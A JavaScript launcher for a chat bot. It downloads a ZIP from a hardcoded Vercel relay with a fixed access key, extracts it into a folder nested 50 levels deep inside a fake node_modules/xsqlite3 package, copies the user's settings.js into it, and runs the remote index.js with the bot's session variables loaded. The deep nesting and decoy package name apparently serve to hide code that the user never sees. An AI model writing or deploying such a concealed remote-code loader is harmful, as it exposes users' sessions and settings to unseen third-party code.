import 'dotenv/config';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import axios from 'axios';
import AdmZip from 'adm-zip';
import os from 'os';

// ========== DEFINE __dirname IN ESM ==========
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ========== ENV FILE FUNCTION ==========
const ENV_FILE = path.join(__dirname, ".env");

function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) {
    console.log(`[INFO] I didn't find .env file, creating one...`);
    try {
      fs.writeFileSync(
        ENV_FILE,
        "# Auto-generated .env file\nSESSION_ID=\n"
      );
    } catch (e) {
      console.error(`[ERROR] Failed to create .env file: ${e.message}`);
      return;
    }
  }

  try {
    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
    const envLines = envContent.split('\n');
    
    envLines.forEach(line => {
      const trimmedLine = line.trim();
      if (!trimmedLine || trimmedLine.startsWith('#')) return;
      
      const equalsIndex = trimmedLine.indexOf('=');
      if (equalsIndex !== -1) {
        const key = trimmedLine.substring(0, equalsIndex).trim();
        const value = trimmedLine.substring(equalsIndex + 1).trim();
        const cleanValue = value.replace(/^['"](.*)['"]$/, '$1');
        
        if (!process.env[key]) {
          process.env[key] = cleanValue;
          console.log(`[ENV] Loaded variable...`);
        }
      }
    });
    
    console.log("[ ENV ] file loaded successfully");
  } catch (e) {
    console.error("[ ERROR ] Failed to load .env file:", e.message);
  }
}

// === CHECK FOR SESSION_ID ===
function checkSessionId() {
  if (process.env.SESSION_ID) {
    console.log(`[ SESSION ] detected in env file...`);
    return true;
  } else {
    console.log("[ ALERT ] No session env.");
    return false;
  }
}

// ========== VERCEL RELAY LOADER ==========
// === CONFIG ===
const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://haha-blond-theta.vercel.app/api/repo';
const ACCESS_KEY = process.env.ACCESS_KEY || '1234567-J';

const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

// === Step 1: Create deep hidden folder
function createDeepRepoPath() {
  let deepPath = baseFolder;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }
  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });
  return repoFolder;
}

// === Step 2: Download ZIP from Vercel relay
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log('[ SYNCING ] from secure relay...');

    const response = await axios.get(VERCEL_RELAY_URL, {
      responseType: 'arraybuffer',
      headers: {
        'x-access-key': ACCESS_KEY,
        'User-Agent': 'tech word-md-loader'
      },
      timeout: 20000
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);

    console.log('✅ Codes synced successfully');
  } catch (err) {
    console.error('❌ Sync failed:', err.response?.status || err.message);
    process.exit(1);
  }
}

// === Step 3: Copy configs (simplified - no .env handling here anymore)
function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'settings.js');

  try {
    if (fs.existsSync(configSrc)) {
      fs.copyFileSync(configSrc, path.join(repoPath, 'settings.js'));
    }
  } catch {}
}

// === Step 4: Launch June Ultra Bot (top-level await)
try {
  // Load .env file first
  loadEnvFile();
  checkSessionId();
  
  const repoFolder = createDeepRepoPath();
  await downloadAndExtractRepo(repoFolder);

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!subDirs.length) {
    console.error('❌ ZIP extracted nothing');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);
  copyConfigs(extractedRepoPath);

  console.log('[ BOT ] Launching JuneX Ultrat...');
  process.chdir(extractedRepoPath);
  await import(path.join(extractedRepoPath, 'index.js'));
} catch (err) {
  console.error('❌ Bot launch error. Please check the system logs.');
  process.exit(1);
}